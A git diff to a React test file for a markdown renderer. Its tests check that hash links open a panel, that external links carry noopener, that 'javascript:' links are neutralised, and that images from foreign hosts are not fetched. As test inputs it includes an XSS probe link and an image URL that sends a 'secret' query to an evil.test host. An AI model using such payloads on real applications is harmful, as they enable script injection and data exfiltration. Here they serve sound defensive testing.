@@ -4,7 +4,8 @@
 // plugin set copied across four files; these tests lock in the four behaviours the surfaces rely
 // on, so a change to the shared renderer can't silently regress any of them.
 import { describe, it, expect, afterEach, vi } from 'vitest';
-import { render, cleanup, screen } from '@testing-library/react';
+import { render, cleanup, screen, fireEvent } from '@testing-library/react';
+import { panelBus } from '../../src/client/lib/panelBus.js';
 import { RichMarkdown } from '../../src/client/components/RichMarkdown.js';
 
 // Mermaid renders asynchronously through a real lib; stub it so the mermaid-fence test asserts
@@ -53,12 +54,38 @@ describe('RichMarkdown — the one markdown-string renderer', () => {
     expect(container.textContent).toContain('$12');
   });
 
-  it('wikiLinks off: a #/page/ anchor is a plain link; on: it carries the wiki-link class', () => {
-    const plain = render(<RichMarkdown text="see [attention](#/page/attention)" />);
-    expect(plain.container.querySelector('a.wiki-link')).toBeNull();
-    cleanup();
-    const wiki = render(<RichMarkdown text="see [attention](#/page/attention)" wikiLinks />);
-    expect(wiki.container.querySelector('a.wiki-link')).not.toBeNull();
+  it('opens a #/page/ link in the Page tab instead of switching the conversation hash', () => {
+    const seen: string[] = [];
+    const off = panelBus.subscribe((e) => { if (e.type === 'openPage') seen.push(e.slug); });
+    const { getByRole } = render(<RichMarkdown text="see [attention](#/page/attention)" />);
+    const before = location.hash;
+    fireEvent.click(getByRole('link', { name: 'attention' }));
+    expect(seen).toEqual(['attention']);
+    expect(location.hash).toBe(before);
+    off();
+  });
+
+  it('opens an external link in a new tab without an opener', () => {
+    const { getByRole } = render(<RichMarkdown text="per [the source](https://example.edu/sum)" />);
+    const a = getByRole('link', { name: 'the source' });
+    expect(a.getAttribute('target')).toBe('_blank');
+    expect(a.getAttribute('rel')).toBe('noopener noreferrer');
+  });
+
+  it('renders an unsafe, relative or conversation-hash link as text, not a link to the app', () => {
+    const { container } = render(<RichMarkdown text="[a](javascript:alert(1)) [b](#/t/other) [c](/api/status)" />);
+    expect(container.querySelector('a')).toBeNull();
+    expect(container.textContent).toContain('a b c');
+  });
+
+  it('never fetches a foreign image; it offers a link naming the host', () => {
+    const { container, getByRole } = render(
+      <RichMarkdown text="![chart](https://evil.test/p.png?q=secret) ![ok](/api/uploads/fig.png)" />,
+    );
+    const imgs = [...container.querySelectorAll('img')];
+    expect(imgs.map((i) => i.getAttribute('src'))).toEqual(['/api/uploads/fig.png']);
+    const link = getByRole('link', { name: /image from evil\.test/ });
+    expect(link.getAttribute('target')).toBe('_blank');
   });
 
   it('an unlabeled [[slug]] link resolves to the page title from the graph; a labeled one keeps its label', async () => {
@@ -80,7 +107,6 @@ describe('RichMarkdown — the one markdown-string renderer', () => {
     render(
       <FreshRichMarkdown
         text="see [qkv-attention](#/page/qkv-attention) and [the basics](#/page/qkv-attention)"
-        wikiLinks
       />,
     );
     // Async: the title only exists once usePageTitle's graph fetch resolves.
